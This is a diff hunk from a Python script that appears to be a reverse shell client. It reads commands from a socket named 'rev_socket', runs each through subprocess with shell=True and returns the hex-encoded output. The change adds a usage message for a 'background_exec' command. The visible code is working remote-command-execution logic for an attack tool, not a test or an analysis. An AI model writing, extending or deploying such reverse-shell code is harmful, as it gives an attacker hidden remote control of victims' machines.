@@ -52,10 +52,14 @@ while True:
         rev_socket.send(hex_handler(os.getcwd() + '>', encode=True))
         continue
 
-    if command.startswith('background_exec') and len(command.split()) >= 2:
-        background_exec = subprocess.Popen(command[15:], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-        rev_socket.send(hex_handler('\n', encode=True))
-        continue
+    if command.startswith('background_exec'):
+        if len(command.split()) >= 2:
+            background_exec = subprocess.Popen(command[15:], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+            rev_socket.send(hex_handler('\n', encode=True))
+            continue
+        else:
+            rev_socket.send(hex_handler('Use background_exec in the format background_exec COMMAND.', encode=True))
+            continue
 
     output = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
     try:
